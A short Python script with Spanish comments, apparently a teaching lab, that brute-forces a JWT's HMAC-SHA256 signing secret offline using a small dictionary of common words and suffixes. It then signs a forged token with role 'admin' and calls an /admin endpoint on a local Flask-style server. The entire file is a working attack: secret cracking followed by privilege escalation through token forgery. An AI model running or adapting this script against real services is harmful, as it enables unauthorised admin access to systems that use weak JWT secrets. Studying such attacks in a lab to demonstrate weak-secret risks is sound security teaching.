import base64
import hashlib
import hmac
import time
import jwt
import requests

URL = "http://127.0.0.1:5000"

# 1. Un token legítimo, obtenido con nuestra cuenta normal
with open("token.txt") as f:
    token = f.read().strip()

header_b64, payload_b64, firma_b64 = token.split(".")
mensaje_firmado = f"{header_b64}.{payload_b64}".encode()
firma_real = base64.urlsafe_b64decode(firma_b64 + "=" * (-len(firma_b64) % 4))

# 2. Diccionario: palabras típicas + variaciones (lo que hacen las "reglas" de hashcat)
palabras = ["admin", "password", "clave", "jwt", "token", "key", "upc",
            "flask", "changeme", "test", "dev", "lima", "peru", "secreto", "secret"]
sufijos = ["", "1", "12", "123", "1234", "!", "2024", "2025", "2026"]
candidatos = [p + s for p in palabras for s in sufijos]
candidatos += [c.capitalize() for c in candidatos] + [c.upper() for c in candidatos]

# 3. Para cada candidato: calculamos la firma HMAC-SHA256 y la comparamos
inicio = time.time()
encontrado = None
for i, clave in enumerate(candidatos, start=1):
    firma = hmac.new(clave.encode(), mensaje_firmado, hashlib.sha256).digest()
    if hmac.compare_digest(firma, firma_real):
        encontrado = clave
        break
duracion = time.time() - inicio

if not encontrado:
    print(f"Probadas {len(candidatos)} claves en {duracion:.3f} s. Ninguna funcionó.")
    raise SystemExit

print(f"¡Clave encontrada!: '{encontrado}' (intento {i} de {len(candidatos)}, {duracion:.3f} s)")

# 4. Con la clave real, firmamos un token de admin VÁLIDO
token_admin = jwt.encode({"sub": "alumno", "role": "admin"}, encontrado, algorithm="HS256")
r = requests.get(f"{URL}/admin", headers={"Authorization": f"Bearer {token_admin}"})
print("\n/admin ->", r.status_code, r.json())
